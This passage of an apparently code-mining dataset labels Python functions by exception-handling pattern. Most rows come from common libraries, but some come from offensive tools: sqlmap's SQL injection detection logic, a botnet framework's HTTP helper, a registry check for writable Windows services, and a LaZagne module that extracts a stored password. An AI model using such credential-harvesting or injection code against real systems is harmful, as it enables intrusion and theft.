                                        infoMsg = ""%sparameter '%s' is '%s' injectable "" % (""%s "" % paramType if paramType != parameter else """", parameter, title)
                                        logger.info(infoMsg)

                                        injectable = True

                            except SqlmapConnectionException as ex:
                                debugMsg = ""problem occurred most likely because the ""
                                debugMsg += ""server hasn't recovered as expected from the ""
                                debugMsg += ""used error-based payload ('%s')"" % getSafeExString(ex)
                                logger.debug(debugMsg)

                        # In case of time-based blind or stacked queries
                        # SQL injections
                        elif method == PAYLOAD.METHOD.TIME:
                            # Perform the test's request
                            trueResult = Request.queryPage(reqPayload, place, timeBasedCompare=True, raise404=False)
                            trueCode = threadData.lastCode

                            if trueResult:
                                # Extra validation step (e.g. to check for DROP protection mechanisms)
                                if SLEEP_TIME_MARKER in reqPayload:
                                    falseResult = Request.queryPage(reqPayload.replace(SLEEP_TIME_MARKER, ""0""), place, timeBasedCompare=True, raise404=False)
                                    if falseResult:
                                        continue

                                # Confirm test's results
                                trueResult = Request.queryPage(reqPayload, place, timeBasedCompare=True, raise404=False)

                                if trueResult:
                                    infoMsg = ""%sparameter '%s' appears to be '%s' injectable "" % (""%s "" % paramType if paramType != parameter else """", parameter, title)
                                    logger.info(infoMsg)

                                    injectable = True

                        # In case of UNION query SQL injection
                        elif method == PAYLOAD.METHOD.UNION:
                            # Test for UNION injection and set the sample
                            # payload as well as the vector.
                            # NOTE: vector is set to a tuple with 6 elements,
                            # used afterwards by Agent.forgeUnionQuery()
                            # method to forge the UNION query payload

                            configUnion(test.request.char, test.request.columns)

                            if len(kb.dbmsFilter or []) == 1:
                                Backend.forceDbms(kb.dbmsFilter[0])
                            elif not Backend.getIdentifiedDbms():
                                if kb.heuristicDbms is None:
                                    if kb.heuristicTest == HEURISTIC_TEST.POSITIVE or injection.data:
                                        warnMsg = ""using unescaped version of the test ""
                                        warnMsg += ""because of zero knowledge of the ""
                                        warnMsg += ""back-end DBMS. You can try to ""
                                        warnMsg += ""explicitly set it with option '--dbms'""
                                        singleTimeWarnMessage(warnMsg)
                                else:
                                    Backend.forceDbms(kb.heuristicDbms)

                            if unionExtended:
                                infoMsg = ""automatically extending ranges for UNION ""
                                infoMsg += ""query injection technique tests as ""
                                infoMsg += ""there is at least one other (potential) ""
                                infoMsg += ""technique found""
                                singleTimeLogMessage(infoMsg)

                            # Test for UNION query SQL injection
                            reqPayload, vector = unionTest(comment, place, parameter, value, prefix, suffix)

                            if isinstance(reqPayload, six.string_types):
                                infoMsg = ""%sparameter '%s' is '%s' injectable"" % (""%s "" % paramType if paramType != parameter else """", parameter, title)
                                logger.info(infoMsg)

                                injectable = True

                                # Overwrite 'where' because it can be set
                                # by unionTest() directly
                                where = vector[6]

                        kb.previousMethod = method

                        if conf.offline:
                            injectable = False

                    # If the injection test was successful feed the injection
                    # object with the test's details
                    if injectable is True:
                        # Feed with the boundaries details only the first time a
                        # test has been successful
                        if injection.place is None or injection.parameter is None:
                            if place in (PLACE.USER_AGENT, PLACE.REFERER, PLACE.HOST):
                                injection.parameter = place
                            else:
                                injection.parameter = parameter

                            injection.place = place
                            injection.ptype = ptype
                            injection.prefix = prefix
                            injection.suffix = suffix
                            injection.clause = clause

                        # Feed with test details every time a test is successful
                        if hasattr(test, ""details""):
                            for key, value in test.details.items():
                                if key == ""dbms"":
                                    injection.dbms = value

                                    if not isinstance(value, list):
                                        Backend.setDbms(value)
                                    else:
                                        Backend.forceDbms(value[0], True)

                                elif key == ""dbms_version"" and injection.dbms_version is None and not conf.testFilter:
                                    injection.dbms_version = Backend.setVersion(value)

                                elif key == ""os"" and injection.os is None:
                                    injection.os = Backend.setOs(value)

                        if vector is None and ""vector"" in test and test.vector is not None:
                            vector = test.vector

                        injection.data[stype] = AttribDict()
                        injection.data[stype].title = title
                        injection.data[stype].payload = agent.removePayloadDelimiters(reqPayload)
                        injection.data[stype].where = where
                        injection.data[stype].vector = vector
                        injection.data[stype].comment = comment
                        injection.data[stype].templatePayload = templatePayload
                        injection.data[stype].matchRatio = kb.matchRatio
                        injection.data[stype].trueCode = trueCode
                        injection.data[stype].falseCode = falseCode

                        injection.conf.textOnly = conf.textOnly
                        injection.conf.titles = conf.titles
                        injection.conf.code = conf.code
                        injection.conf.string = conf.string
                        injection.conf.notString = conf.notString
                        injection.conf.regexp = conf.regexp
                        injection.conf.optimize = conf.optimize

                        if conf.beep:
                            beep()

                        # There is no need to perform this test for other
                        # <where> tags
                        break

                if injectable is True:
                    kb.vulnHosts.add(conf.hostname)
                    break

            # Reset forced back-end DBMS value
            Backend.flushForcedDbms()

        except KeyboardInterrupt:
            warnMsg = ""user aborted during detection phase""
            logger.warning(warnMsg)

            if conf.multipleTargets:
                msg = ""how do you want to proceed? [ne(X)t target/(s)kip current test/(e)nd detection phase/(n)ext parameter/(c)hange verbosity/(q)uit]""
                choice = readInput(msg, default='X', checkBatch=False).upper()
            else:
                msg = ""how do you want to proceed? [(S)kip current test/(e)nd detection phase/(n)ext parameter/(c)hange verbosity/(q)uit]""
                choice = readInput(msg, default='S', checkBatch=False).upper()

            if choice == 'X':
                if conf.multipleTargets:
                    raise SqlmapSkipTargetException
            elif choice == 'C':
                choice = None
                while not ((choice or """").isdigit() and 0 <= int(choice) <= 6):
                    if choice:
                        logger.warning(""invalid value"")
                    msg = ""enter new verbosity level: [0-6] ""
                    choice = readInput(msg, default=str(conf.verbose), checkBatch=False)
                conf.verbose = int(choice)
                setVerbosity()
                tests.insert(0, test)
            elif choice == 'N':
                return None
            elif choice == 'E':
                kb.endDetection = True
            elif choice == 'Q':
                raise SqlmapUserQuitException

        finally:
            # Reset forced back-end DBMS value
            Backend.flushForcedDbms()

    Backend.flushForcedDbms(True)

    # Return the injection object
    if injection.place is not None and injection.parameter is not None:
        if not conf.dropSetCookie and PAYLOAD.TECHNIQUE.BOOLEAN in injection.data and injection.data[PAYLOAD.TECHNIQUE.BOOLEAN].vector.startswith('OR'):
            warnMsg = ""in OR boolean-based injection cases, please consider usage ""
            warnMsg += ""of switch '--drop-set-cookie' if you experience any ""
            warnMsg += ""problems during data retrieval""
            logger.warning(warnMsg)

        if not checkFalsePositives(injection):
            if conf.hostname in kb.vulnHosts:
                kb.vulnHosts.remove(conf.hostname)
            if NOTE.FALSE_POSITIVE_OR_UNEXPLOITABLE not in injection.notes:
                injection.notes.append(NOTE.FALSE_POSITIVE_OR_UNEXPLOITABLE)
    else:
        injection = None

    if injection and NOTE.FALSE_POSITIVE_OR_UNEXPLOITABLE not in injection.notes:
        checkSuhosinPatch(injection)
        checkFilteredChars(injection)

    return injection",Nested Try-Except Blocks,1
259,apprise,/home/r4ph/desenv/phd/exception-miner/projects/py/apprise/apprise/plugins/NotifyTwitter.py,_fetch,"def _fetch(self, url, payload=None, method='POST', json=True):
        """"""
        Wrapper to Twitter API requests object
        """"""

        headers = {
            'User-Agent': self.app_id,
        }

        data = None
        files = None

        # Open our attachment path if required:
        if isinstance(payload, AttachBase):
            # prepare payload
            files = {'media': (payload.name, open(payload.path, 'rb'))}

        elif json:
            headers['Content-Type'] = 'application/json'
            data = dumps(payload)

        else:
            data = payload

        auth = OAuth1(
            self.ckey,
            client_secret=self.csecret,
            resource_owner_key=self.akey,
            resource_owner_secret=self.asecret,
        )

        # Some Debug Logging
        self.logger.debug('Twitter {} URL: {} (cert_verify={})'.format(
            method, url, self.verify_certificate))
        self.logger.debug('Twitter Payload: %s' % str(payload))

        # By default set wait to None
        wait = None

        if self.ratelimit_remaining == 0:
            # Determine how long we should wait for or if we should wait at
            # all. This isn't fool-proof because we can't be sure the client
            # time (calling this script) is completely synced up with the
            # Twitter server.  One would hope we're on NTP and our clocks are
            # the same allowing this to role smoothly:

            now = datetime.now(timezone.utc).replace(tzinfo=None)
            if now < self.ratelimit_reset:
                # We need to throttle for the difference in seconds
                # We add 0.5 seconds to the end just to allow a grace
                # period.
                wait = (self.ratelimit_reset - now).total_seconds() + 0.5

        # Default content response object
        content = {}

        # Always call throttle before any remote server i/o is made;
        self.throttle(wait=wait)

        # acquire our request mode
        fn = requests.post if method == 'POST' else requests.get
        try:
            r = fn(
                url,
                data=data,
                files=files,
                headers=headers,
                auth=auth,
                verify=self.verify_certificate,
                timeout=self.request_timeout,
            )

            try:
                content = loads(r.content)

            except (AttributeError, TypeError, ValueError):
                # ValueError = r.content is Unparsable
                # TypeError = r.content is None
                # AttributeError = r is None
                content = {}

            if r.status_code != requests.codes.ok:
                # We had a problem
                status_str = \
                    NotifyTwitter.http_response_code_lookup(r.status_code)

                self.logger.warning(
                    'Failed to send Twitter {} to {}: '
                    '{}error={}.'.format(
                        method,
                        url,
                        ', ' if status_str else '',
                        r.status_code))

                self.logger.debug(
                    'Response Details:\r\n{}'.format(r.content))

                # Mark our failure
                return (False, content)

            try:
                # Capture rate limiting if possible
                self.ratelimit_remaining = \
                    int(r.headers.get('x-rate-limit-remaining'))
                self.ratelimit_reset = datetime.fromtimestamp(
                    int(r.headers.get('x-rate-limit-reset')), timezone.utc
                ).replace(tzinfo=None)

            except (TypeError, ValueError):
                # This is returned if we could not retrieve this information
                # gracefully accept this state and move on
                pass

        except requests.RequestException as e:
            self.logger.warning(
                'Exception received when sending Twitter {} to {}: '.
                format(method, url))
            self.logger.debug('Socket Exception: %s' % str(e))

            # Mark our failure
            return (False, content)

        except (OSError, IOError) as e:
            self.logger.warning(
                'An I/O error occurred while handling {}.'.format(
                    payload.name if isinstance(payload, AttachBase)
                    else payload))
            self.logger.debug('I/O Exception: %s' % str(e))
            return (False, content)

        finally:
            # Close our file (if it's open) stored in the second element
            # of our files tuple (index 1)
            if files:
                files['media'][1].close()

        return (True, content)",Nested Try-Except Blocks,1
260,byob,/home/r4ph/desenv/phd/exception-miner/projects/py/byob/web-gui/buildyourownbotnet/core/util.py,post,"def post(url, headers={}, data={}, json={}, as_json=False):
    """"""
    Make a HTTP post request and return response

    `Required`
    :param str url:       URL of target web page

    `Optional`
    :param dict headers:  HTTP request headers
    :param dict data:     HTTP request POST data
    :param dict json:     POST data in JSON format
    :param bool as_json:  return JSON formatted output

    """"""
    try:
        import requests
        req = requests.post(url, headers=headers, data=data, json=json)
        output = req.content
        if as_json:
            try:
                output = req.json()
            except: pass
        return output
    except:
        import sys
        if sys.version_info[0] > 2:
            from urllib.request import urlopen,urlencode,Request
        else:
            from urllib import urlencode
            from urllib2 import urlopen,Request
        data = urlencode(data)
        req  = Request(str(url), data=data)
        for key, value in headers.items():
            req.headers[key] = value
        output = urlopen(req).read()
        if as_json:
            import json
            try:
                output = json.loads(output)
            except: pass
        return output",Nested Try-Except Blocks,1
261,celery,/home/r4ph/desenv/exception-miner/projects/py/celery/celery/utils/threads.py,run,"def run(self):
        body = self.body
        shutdown_set = self.__is_shutdown.is_set
        try:
            while not shutdown_set():
                try:
                    body()
                except Exception as exc:  # pylint: disable=broad-except
                    try:
                        self.on_crash('{0!r} crashed: {1!r}', self.name, exc)
                        self._set_stopped()
                    finally:
                        sys.stderr.flush()
                        os._exit(1)  # exiting by normal means won't work
        finally:
            self._set_stopped()",Nested Try-Except Blocks,1
262,archivebox,/home/r4ph/desenv/exception-miner/projects/py/archivebox/deb_dist/archivebox-0.5.3/archivebox/extractors/mercury.py,save_mercury,"def save_mercury(link: Link, out_dir: Optional[Path]=None, timeout: int=TIMEOUT) -> ArchiveResult:
    """"""download reader friendly version using @postlight/mercury-parser""""""

    out_dir = Path(out_dir or link.link_dir)
    output_folder = out_dir.absolute() / ""mercury""
    output = str(output_folder)

    status = 'succeeded'
    timer = TimedProgress(timeout, prefix='      ')
    try:
        # Get plain text version of article
        cmd = [
            DEPENDENCIES['MERCURY_BINARY']['path'],
            link.url,
            ""--format=text""
        ]
        result = run(cmd, cwd=out_dir, timeout=timeout)
        try:
            article_text = json.loads(result.stdout)
        except json.JSONDecodeError:
            raise ShellError(cmd, result)
        
        # Get HTML version of article
        cmd = [
            DEPENDENCIES['MERCURY_BINARY']['path'],
            link.url
        ]
        result = run(cmd, cwd=out_dir, timeout=timeout)
        try:
            article_json = json.loads(result.stdout)
        except json.JSONDecodeError:
            raise ShellError(cmd, result)

        output_folder.mkdir(exist_ok=True)
        atomic_write(str(output_folder / ""content.html""), article_json.pop(""content""))
        atomic_write(str(output_folder / ""content.txt""), article_text[""content""])
        atomic_write(str(output_folder / ""article.json""), article_json)

        # Check for common failure cases
        if (result.returncode > 0):
            raise ShellError(cmd, result)
    except (ArchiveError, Exception, OSError) as err:
        status = 'failed'
        output = err
    finally:
        timer.end()

    return ArchiveResult(
        cmd=cmd,
        pwd=str(out_dir),
        cmd_version=MERCURY_VERSION,
        output=output,
        status=status,
        **timer.stats,
    )",Nested Try-Except Blocks,1
263,great,/home/r4ph/desenv/phd/exception-miner/projects/py/great_expectations/great_expectations/dataset/pandas_dataset.py,_expect_column_values_to_be_of_type__map,"def _expect_column_values_to_be_of_type__map(  # noqa: PLR0913
        self,
        column,
        type_,
        mostly=None,
        result_format=None,
        row_condition=None,
        condition_parser=None,
        include_config=True,
        catch_exceptions=None,
        meta=None,
    ):
        comp_types = []
        try:
            comp_types.append(np.dtype(type_).type)
        except TypeError:
            try:
                pd_type = getattr(pd, type_)
                if isinstance(pd_type, type):
                    comp_types.append(pd_type)
            except AttributeError:
                pass

            try:
                pd_type = getattr(pd.core.dtypes.dtypes, type_)
                if isinstance(pd_type, type):
                    comp_types.append(pd_type)
            except AttributeError:
                pass

        native_type = self._native_type_type_map(type_)
        if native_type is not None:
            comp_types.extend(native_type)

        if len(comp_types) < 1:
            raise ValueError(f""Unrecognized numpy/python type: {type_}"")

        return column.map(lambda x: isinstance(x, tuple(comp_types)))",Nested Try-Except Blocks,1
264,numba,/home/r4ph/desenv/phd/exception-miner/projects/py/numba/numba/core/tracing.py,wrapper,"def wrapper(*args, **kwds):
            if not logger.isEnabledFor(logging.INFO) or tls.tracing:
                return func(*args, **kwds)

            fname, ftype = find_function_info(func, spec, args)

            try:
                tls.tracing = True
                enter, leave = create_events(fname, spec, args, kwds)

                try:
                    logger.info(''.join(enter))
                    tls.indent += 1
                    try:
                        try:
                            tls.tracing = False
                            result = func(*args, **kwds)
                        finally:
                            tls.tracing = True
                    except:
                        type, value, traceback = sys.exc_info()
                        leave.append(' => exception thrown\n\traise ')
                        mname = type.__module__
                        if mname != '__main__':
                            leave.append(mname)
                            leave.append('.')
                        leave.append(type.__name__)
                        if value.args:
                            leave.append('(')
                            leave.append(', '.join(chop(v) for v in value.args))
                            leave.append(')')
                        else:
                            leave.append('()')
                        raise
                    else:
                        if result is not None:
                            leave.append(' -> ')
                            leave.append(chop(result))
                finally:
                    tls.indent -= 1
                    logger.info(''.join(leave))
            finally:
                tls.tracing = False
            return result",Nested Try-Except Blocks,1
265,keras,/home/r4ph/desenv/exception-miner/projects/py/keras/keras/utils/layer_utils_test.py,test_print_summary_expand_nested,"def test_print_summary_expand_nested(self):
        shape = (None, None, 3)

        def make_model():
            x = inputs = keras.Input(shape)
            x = keras.layers.Conv2D(3, 1)(x)
            x = keras.layers.BatchNormalization()(x)
            return keras.Model(inputs, x)

        x = inner_inputs = keras.Input(shape)
        x = make_model()(x)
        inner_model = keras.Model(inner_inputs, x)

        inputs = keras.Input(shape)
        model = keras.Model(inputs, inner_model(inputs))

        file_name = ""model_2.txt""
        temp_dir = self.get_temp_dir()
        self.addCleanup(shutil.rmtree, temp_dir, ignore_errors=True)
        fpath = os.path.join(temp_dir, file_name)
        writer = open(fpath, ""w"")

        def print_to_file(text):
            print(text, file=writer)

        try:
            layer_utils.print_summary(
                model, print_fn=print_to_file, expand_nested=True
            )
            self.assertTrue(tf.io.gfile.exists(fpath))
            writer.close()
            reader = open(fpath, ""r"")
            lines = reader.readlines()
            reader.close()
            check_str = (
                'Model: ""model_2""\n'
                ""_________________________________________________________________\n""  # noqa: E501
                "" Layer (type)                Output Shape              Param #   \n""  # noqa: E501
                ""=================================================================\n""  # noqa: E501
                "" input_3 (InputLayer)        [(None, None, None, 3)]   0         \n""  # noqa: E501
                ""                                                                 \n""  # noqa: E501
                "" model_1 (Functional)        (None, None, None, 3)     24        \n""  # noqa: E501
                ""|¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯|\n""  # noqa: E501
                ""| input_1 (InputLayer)       [(None, None, None, 3)]   0        |\n""  # noqa: E501
                ""|                                                               |\n""  # noqa: E501
                ""| model (Functional)         (None, None, None, 3)     24       |\n""  # noqa: E501
                ""||¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯||\n""  # noqa: E501
                ""|| input_2 (InputLayer)      [(None, None, None, 3)]   0       ||\n""  # noqa: E501
                ""||                                                             ||\n""  # noqa: E501
                ""|| conv2d (Conv2D)           (None, None, None, 3)     12      ||\n""  # noqa: E501
                ""||                                                             ||\n""  # noqa: E501
                ""|| batch_normalization (Bat  (None, None, None, 3)     12      ||\n""  # noqa: E501
                ""|| chNormalization)                                            ||\n""  # noqa: E501
                ""|¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯|\n""  # noqa: E501
                ""¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯\n""  # noqa: E501
                ""=================================================================\n""  # noqa: E501
                ""Total params: 24 (96.00 Byte)\n""
                ""Trainable params: 18 (72.00 Byte)\n""
                ""Non-trainable params: 6 (24.00 Byte)\n""
                ""_________________________________________________________________\n""  # noqa: E501
            )

            fin_str = """".join(lines)

            self.assertIn(fin_str, check_str)
            self.assertEqual(len(lines), 25)
        except ImportError:
            pass",Swallowing Exceptions,1
266,cython,/home/r4ph/desenv/phd/exception-miner/projects/py/cython/Cython/Utils.py,is_cython_generated_file,"def is_cython_generated_file(path, allow_failed=False, if_not_found=True):
    failure_marker = b""#error Do not use this file, it is the result of a failed Cython compilation.""
    file_content = None
    if os.path.exists(path):
        try:
            with open(path, ""rb"") as f:
                file_content = f.read(len(failure_marker))
        except (OSError, IOError):
            pass  # Probably just doesn't exist any more

    if file_content is None:
        # file does not exist (yet)
        return if_not_found

    return (
        # Cython C file?
        file_content.startswith(b""/* Generated by Cython "") or
        # Cython output file after previous failures?
        (allow_failed and file_content == failure_marker) or
        # Let's allow overwriting empty files as well. They might have resulted from previous failures.
        not file_content
    )",Swallowing Exceptions,1
267,pupy,/home/r4ph/desenv/phd/exception-miner/projects/py/pupy/pupy/external/BeRoot/Windows/BeRoot/beroot/modules/get_info/from_registry.py,get_services_from_registry,"def get_services_from_registry(self):
        """"""
        Read all service information from registry
        """"""
        service_keys = []

        # Open the Base on read only
        access_read = KEY_READ | KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE
        access_write = KEY_WRITE | KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE

        hkey = OpenKey(HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services', 0, access_read)
        num = winreg.QueryInfoKey(hkey)[0]

        # Loop through all subkeys
        for x in range(0, num):
            sk = Service()

            # Name of the service
            svc = winreg.EnumKey(hkey, x)
            sk.name = svc

            # ------ Check Write access of the key ------
            try:
                sk.key = ""HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\%s"" % svc
                skey = OpenKey(hkey, svc, 0, access_write)
                sk.is_key_writable = ""HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\%s"" % svc
            except Exception:
                skey = OpenKey(hkey, svc, 0, access_read)
                pass

            # ------ Check if the key has the Parameters\Application value presents ------
            try:
                # Find display name
                display_name = str(winreg.QueryValueEx(skey, 'DisplayName')[0])
                if display_name:
                    sk.display_name = display_name
            except Exception:
                # In case there is no key called DisplayName
                pass

            # ------ Check if the key has his executable with write access and the folder containing it as well ------
            try:
                skey = OpenKey(hkey, svc, 0, access_read)

                # Find ImagePath name
                image_path = str(winreg.QueryValueEx(skey, 'ImagePath')[0])

                if image_path:
                    image_path = os.path.expandvars(image_path)

                    if 'drivers' not in image_path.lower():
                        sk.full_path = image_path
                        sk.paths = get_path_info(image_path)
            except Exception:
                pass

            service_keys.append(sk)
        return service_keys",Swallowing Exceptions,1
268,mlflow,/home/r4ph/desenv/phd/exception-miner/projects/py/mlflow/tests/gateway/tools.py,start_mlflow_server,"def start_mlflow_server(port, model_uri):
    server_url = f""http://127.0.0.1:{port}""

    env = dict(os.environ)
    env.update(LC_ALL=""en_US.UTF-8"", LANG=""en_US.UTF-8"")
    env.update(MLFLOW_TRACKING_URI=mlflow.get_tracking_uri())
    env.update(MLFLOW_HOME=_get_mlflow_home())
    scoring_cmd = [
        ""mlflow"",
        ""models"",
        ""serve"",
        ""-m"",
        model_uri,
        ""-p"",
        str(port),
        ""--install-mlflow"",
        ""--no-conda"",
    ]

    server_pid = _start_scoring_proc(cmd=scoring_cmd, env=env, stdout=sys.stdout, stderr=sys.stdout)

    ping_status = None
    for i in range(120):
        time.sleep(1)
        try:
            ping_status = requests.get(url=f""{server_url}/ping"")
            if ping_status.status_code == 200:
                break
        except Exception:
            pass
    if ping_status is None or ping_status.status_code != 200:
        raise Exception(""Could not start mlflow serving instance."")

    return ServerInfo(pid=server_pid, url=server_url)",Swallowing Exceptions,1
269,click,/home/r4ph/desenv/phd/exception-miner/projects/py/click/src/click/_winconsole.py,write,"def write(self, x: t.AnyStr) -> int:
        if isinstance(x, str):
            return self._text_stream.write(x)
        try:
            self.flush()
        except Exception:
            pass
        return self.buffer.write(x)",Swallowing Exceptions,1
270,airtest,/home/r4ph/desenv/phd/exception-miner/projects/py/airtest/airtest/utils/ffmpeg/ffmpeg_setter.py,_get_or_fetch_platform_executables_else_raise_no_lock,"def _get_or_fetch_platform_executables_else_raise_no_lock(fix_permissions=True):
    """"""Either get the executable or raise an error, internal api""""""
    exe_dir = get_platform_dir()
    installed_crumb = os.path.join(exe_dir, ""installed.crumb"")
    if not os.path.exists(installed_crumb):
        print(""\n===========ffmpeg is missing, fetching it now.=============\n"")
        # All zip files store their platform executables in a folder
        # like ""win32"" or ""darwin"" or ""linux"" inside the executable. So root
        # the install one level up from that same directory.
        install_dir = os.path.dirname(exe_dir)
        try:
            os.makedirs(exe_dir)#, exist_ok=True)
        except:
            pass
        local_zip = exe_dir + "".zip""
        url = get_platform_http_zip()
        download_file(url, local_zip)
        print(""Extracting %s -> %s""%(local_zip, install_dir))
        with zipfile.ZipFile(local_zip, mode=""r"") as zipf:
            zipf.extractall(install_dir)
        try:
            os.remove(local_zip)
        except OSError as err:
            print(""%s: Error could not remove %s because of %s""%(__file__, local_zip, err))
        with open(installed_crumb, ""wt"") as filed:  # pylint: disable=W1514
            filed.write(""installed from %s on %s""%(url, datetime.now().__str__()))
        print(""=============================================================\n"")
    ffmpeg_exe = os.path.join(exe_dir, ""ffmpeg"")
    ffprobe_exe = os.path.join(exe_dir, ""ffprobe"")
    if sys.platform == ""win32"":
        ffmpeg_exe = ""%s.exe""%ffmpeg_exe
        ffprobe_exe = ""%s.exe""%ffprobe_exe
    for exe in [ffmpeg_exe, ffprobe_exe]:
        if (
            fix_permissions
            and sys.platform != ""win32""
            and (not os.access(exe, os.X_OK) or not os.access(exe, os.R_OK))
        ):
            # Set bits for execution and read for all users.
            exe_bits = stat.S_IXOTH | stat.S_IXUSR | stat.S_IXGRP
            read_bits = stat.S_IRUSR | stat.S_IRGRP | stat.S_IXGRP
            os.chmod(exe, exe_bits | read_bits)
            assert os.access(exe, os.X_OK), ""Could not execute %s""%exe
            assert os.access(exe, os.R_OK), ""Could not get read bits of %s""%exe
    return ffmpeg_exe, ffprobe_exe",Swallowing Exceptions,1
271,falcon,/home/r4ph/desenv/phd/exception-miner/projects/py/falcon/falcon/asgi/request.py,root_path,"def root_path(self):
        # PERF(kgriffs): try...except is faster than get() assuming that
        #   we normally expect the key to exist. Even though ASGI 3.0
        #   allows servers to omit the key when the value is an
        #   empty string, at least uvicorn still includes it explicitly in
        #   that case.
        try:
            return self.scope['root_path']
        except KeyError:
            pass

        return ''",Swallowing Exceptions,1
272,ansible,/home/r4ph/desenv/exception-miner/projects/py/ansible/lib/ansible/executor/process/worker.py,_save_stdin,"def _save_stdin(self):
        self._new_stdin = None
        try:
            if sys.stdin.isatty() and sys.stdin.fileno() is not None:
                try:
                    self._new_stdin = os.fdopen(os.dup(sys.stdin.fileno()))
                except OSError:
                    # couldn't dupe stdin, most likely because it's
                    # not a valid file descriptor
                    pass
        except (AttributeError, ValueError):
            # couldn't get stdin's fileno
            pass

        if self._new_stdin is None:
            self._new_stdin = open(os.devnull)",Swallowing Exceptions,1
273,lazagne,/home/r4ph/desenv/phd/exception-miner/projects/py/lazagne/Windows/lazagne/softwares/games/turba.py,run,"def run(self):
        creds = []
        results = None

        # Find the location of steam - to make it easier we're going to use a try block
        # 'cos I'm lazy
        try:
            with win.OpenKey(win.HKEY_CURRENT_USER, 'Software\Valve\Steam') as key:
                results = winreg.QueryValueEx(key, 'SteamPath')
        except Exception:
            pass

        if results:
            steampath = string_to_unicode(results[0])
            steamapps = os.path.join(steampath, u'SteamApps\common')

            # Check that we have a SteamApps directory
            if not os.path.exists(steamapps):
                self.error(u'Steam doesn\'t have a SteamApps directory.')
                return

            filepath = os.path.join(steamapps, u'Turba\\Assets\\Settings.bin')

            if not os.path.exists(filepath):
                self.debug(u'Turba doesn\'t appear to be installed.')
                return

            # If we're here we should have a valid config file file
            with open(filepath, mode='rb') as filepath:
                # We've found a config file, now extract the creds
                data = filepath.read()
                chunk = data[0x1b:].split('\x0a')
                creds.append({
                    'Login': chunk[0],
                    'Password': chunk[1]
                })
            return creds",Swallowing Exceptions,1
274,bottle,/home/r4ph/desenv/phd/exception-miner/projects/py/bottle/bottle.py,run,"def run(self, handler):
        from eventlet import wsgi, listen, patcher
        if not patcher.is_monkey_patched(os):
            msg = ""Bottle requires eventlet.monkey_patch() (before import)""
            raise RuntimeError(msg)
        socket_args = {}
        for arg in ('backlog', 'family'):
            try:
                socket_args[arg] = self.options.pop(arg)
            except KeyError:
                pass
        address = (self.host, self.port)
        try:
            wsgi.server(listen(address, **socket_args), handler,
                        log_output=(not self.quiet))
        except TypeError:
            # Fallback, if we have old version of eventlet
            wsgi.server(listen(address), handler)",Swallowing Exceptions,1
275,cython,/home/r4ph/desenv/phd/exception-miner/projects/py/cython/tests/run/test_asyncgen.py,gen,"async def gen():
            nonlocal DONE
            try:
                yield
            except:
                pass
            DONE = 1",Swallowing Exceptions,1
276,python-prompt-toolkit,/home/r4ph/desenv/phd/exception-miner/projects/py/python-prompt-toolkit/src/prompt_toolkit/contrib/telnet/server.py,stop,"async def stop(self) -> None:
        """"""
        Deprecated: Use `.run()` instead.

        Stop a telnet server that was started using `.start()` and wait for the
        cancellation to complete.
        """"""
        if self._run_task is not None:
            self._run_task.cancel()
            try:
                await self._run_task
            except asyncio.CancelledError:
                pass",Swallowing Exceptions,1
277,calibre,/home/r4ph/desenv/phd/exception-miner/projects/py/calibre/src/calibre/devices/usbms/device.py,eject,"def eject(self):
        if islinux:
            try:
                self.eject_linux()
            except:
                pass
        if isfreebsd:
            try:
                self.eject_freebsd()
            except:
                pass
        if iswindows:
            try:
                self.eject_windows()
            except:
                pass
        if ismacos:
            try:
                self.eject_osx()
            except:
                pass
        self._main_prefix = self._card_a_prefix = self._card_b_prefix = None",Swallowing Exceptions,1
278,calibre,/home/r4ph/desenv/phd/exception-miner/projects/py/calibre/src/calibre/library/catalogs/epub_mobi_builder.py,generate_thumbnail,"def generate_thumbnail(self, title, image_dir, thumb_file):
        """""" Create thumbnail of cover or return previously cached thumb.

        Test thumb archive for currently cached cover. Return cached version, or create
        and cache new version.

        Args:
         title (dict): book metadata
         image_dir (str): directory to write thumb data to
         thumb_file (str): filename to save thumb as

        Output:
         (file): thumb written to /images
         (archive): current thumb archived under cover crc
        """"""
        from calibre.utils.img import scale_image

        def _open_archive(mode='r'):
            try:
                return ZipFile(self.thumbs_path, mode=mode, allowZip64=True)
            except:
                # occurs under windows if the file is opened by another
                # process
                pass

        # Generate crc for current cover
        with open(title['cover'], 'rb') as f:
            data = f.read()
        cover_crc = hex(zlib.crc32(data))

        # Test cache for uuid
        uuid = title.get('uuid')
        if uuid:
            zf = _open_archive()
            if zf is not None:
                with zf:
                    try:
                        zf.getinfo(uuid + cover_crc)
                    except:
                        pass
                    else:
                        # uuid found in cache with matching crc
                        thumb_data = zf.read(uuid + cover_crc)
                        with open(os.path.join(image_dir, thumb_file), 'wb') as f:
                            f.write(thumb_data)
                        return

            # Save thumb for catalog. If invalid data, error returns to generate_thumbnails()
            thumb_data = scale_image(data,
                    width=self.thumb_width, height=self.thumb_height)[-1]
            with open(os.path.join(image_dir, thumb_file), 'wb') as f:
                f.write(thumb_data)

            # Save thumb to archive
            if zf is not None:
                # Ensure that the read succeeded
                # If we failed to open the zip file for reading,
                # we dont know if it contained the thumb or not
                zf = _open_archive('a')
                if zf is not None:
                    with zf:
                        zf.writestr(uuid + cover_crc, thumb_data)",Swallowing Exceptions,1
